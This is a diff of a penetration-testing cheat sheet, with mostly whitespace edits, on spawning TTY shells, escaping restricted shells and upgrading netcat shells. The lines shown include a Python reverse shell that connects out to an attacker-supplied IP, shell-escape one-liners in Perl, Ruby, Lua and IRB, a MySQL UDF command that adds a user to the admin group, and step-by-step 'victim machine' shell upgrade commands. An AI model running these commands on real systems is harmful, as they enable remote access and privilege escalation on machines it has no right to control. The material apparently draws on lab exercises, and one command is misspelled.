@@ -1,13 +1,17 @@
-**== Spawning a TTY Shell - Break out of Jail or limited shell ==**
+**==Spawning a TTY Shell - Break out of Jail or limited shell ==**
 
 **PYTHON**
 -----
 python -c 'import pty; pty.spawn("/bin/bash")'
-PS1='\e[33;1m\u@\h: \e[31m\W\e[0m\$ 
------
+PS1='\e[33;1m\u@\h: \e[31m\W\e[0m\$
+
+ -----
+
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM); s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
------
+ 
+ -----
 python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
+
 =====
 
 
@@ -50,49 +54,51 @@ echo "evil script code" | tee script.sh      // tee -a to append at the end of t
 -----
 
 **OTHERS**
------
+ 
+ -----
+
 perl -e 'exec "/bin/sh";'
------
+ -----
 perl: exec "/bin/sh";
------
+ -----
 ruby: exec "/bin/sh"
------
+ -----
 lua: os.execute('/bin/sh')
------
+ -----
 irb(main:001:0> exec "/bin/sh" 
------
+ -----
 lua: `os.execute('/bin/sh')`
------
+ -----
 `exec "/bin/sh"`     // from IRB
------
+ -----
 select sys_exec('usermod -a -G admin john'); // from mysql command prompt. Then use sudo su and inser john's password.
 
 First things first, for the MySQL UDF to work - MySQL has to be running with root privileges, so let’s check.
 john@Kioptrix4:/var/www$ ls -la /usr/lib/lib_mysqludf_sys.so 
 -rw-rw-rw- 1 root root 12896 2012-02-04 10:08 /usr/lib/lib_mysqludf_sys.so
------
+ -----
 
 **== Upgrading half shells to fully interactive TTYs without closing nc session. ==**
------
+ -----
 python -c 'import pty; pty.spawn("/bin/bash")'
------
+ -----
 background remote shell with Ctrl+Z    // on victim machine
------
+ -----
 stty -a | grep rows    //on attacking machine
 speed 38400 baud; rows 55; columns 205; line = 0;
------
+ -----
 echo $TERM     // on attacking machine
------
+ -----
 sty raw echo   // attacking machine
------
+ -----
 fg             // attacking machine
------
+ -----
 reset          // attacking machine
------
+ -----
 export TERM=xterm-256color //on victim machine
 export SHELL=BASH          //on victim machine
 stty rows 55 columns 205   //on victim machine. See stty -a
------
+ -----
  
 **SHELLS:**
  -----
